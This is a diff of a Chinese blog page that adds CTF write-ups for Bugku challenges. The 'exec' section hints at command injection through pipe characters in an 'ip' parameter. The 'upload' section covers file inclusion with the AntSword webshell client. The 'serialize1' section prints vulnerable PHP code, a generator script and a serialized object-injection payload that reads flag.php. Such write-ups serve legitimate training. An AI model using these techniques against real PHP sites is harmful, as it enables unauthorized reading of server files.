@@ -15,10 +15,14 @@
 <meta property="og:site_name" content="OC的博客">
 <meta property="og:description" content="新bugku平台 https://test.bugku.com/">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-11-24T16:01:06.704Z">
+<meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/exec.png">
+<meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/exec0a.png">
+<meta property="og:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/execls.png">
+<meta property="og:updated_time" content="2020-11-25T04:27:43.071Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bugku_new">
 <meta name="twitter:description" content="新bugku平台 https://test.bugku.com/">
+<meta name="twitter:image" content="https://ocgittt.github.io/2020/11/24/bugku-new/exec.png">
   
     <link rel="alternative" href="/atom.xml" title="OC的博客" type="application/atom+xml">
   
@@ -163,6 +167,24 @@
         <p>新bugku平台</p>
 <p><a href="https://test.bugku.com/" target="_blank" rel="noopener">https://test.bugku.com/</a></p>
 <a id="more"></a>
+
+<h1 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h1><p>访问exec.php文件</p>
+<img src="/2020/11/24/bugku-new/exec.png">
+
+<p>猜测参数为ip</p>
+<p>尝试Windows/Linux管道符</p>
+<p>参考<a href="https://www.sohu.com/a/414062299_653604" target="_blank" rel="noopener">https://www.sohu.com/a/414062299_653604</a></p>
+<p>参考评论</p>
+<img src="/2020/11/24/bugku-new/exec0a.png">
+
+<br>
+
+
+
+<img src="/2020/11/24/bugku-new/execls.png">
+
+
+
 <h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>F12提示include.php
 页面提示参数为file，结合题目，猜测是文件包含的参数</p>
 <p>include.php备注提示upload.php</p>
@@ -185,6 +207,18 @@
 <ul>
 <li>菜刀貌似无法利用伪协议连接，可以使用antsword</li>
 </ul>
+<h1 id="serialize1"><a href="#serialize1" class="headerlink" title="serialize1"></a>serialize1</h1><p>老bugku有一题类似,WP</p>
+<p><a href="https://blog.csdn.net/yh1013024906/article/details/81087939" target="_blank" rel="noopener">https://blog.csdn.net/yh1013024906/article/details/81087939</a></p>
+<p>本题源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $info = <span class="string">'your secret is '</span>.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">        <span class="keyword">echo</span> $info;<span class="comment">#打印$info；注意这里如果打印的是一个类的实例化对象，那么就会调用那个类的__toString()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exam</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;<span class="comment">#__toString()魔术方法：所在类的实例化对象若被当作字符串操作，自动被调用</span></span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$text = $_GET[<span class="string">'text'</span>];</span><br><span class="line">$res = unserialize($text);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username, $password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $info = <span class="string">'your secret is '</span>.<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">        <span class="keyword">echo</span> $info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exam</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$text = $_GET['text'];</span></span><br><span class="line"><span class="comment">#$res = unserialize($text);</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> exam();</span><br><span class="line">$a-&gt;file = <span class="string">'/var/www/html/flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> test(<span class="string">"username"</span>,$a);</span><br><span class="line">$sb = serialize($b);</span><br><span class="line"><span class="keyword">echo</span> $sb;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<blockquote>
+<p>O:4:”test”:2:{s:8:”username”;s:8:”username”;s:8:”password”;O:4:”exam”:1:{s:4:”file”;s:22:”/var/www/html/flag.php”;}}</p>
+</blockquote>
 
       
 
@@ -286,7 +320,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#upload"><span class="toc-number">1.</span> <span class="toc-text">upload</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#exec"><span class="toc-number">1.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#upload"><span class="toc-number">2.</span> <span class="toc-text">upload</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#serialize1"><span class="toc-number">3.</span> <span class="toc-text">serialize1</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -398,6 +432,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">sqli-labs</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sqli-labs-master_les11</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">问题</a>
               </li>
              
@@ -415,14 +457,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">tool</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">sqli-labs</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sqli-labs-master_les11</a>
               </li>
             
             <div class="clearfix"></div>
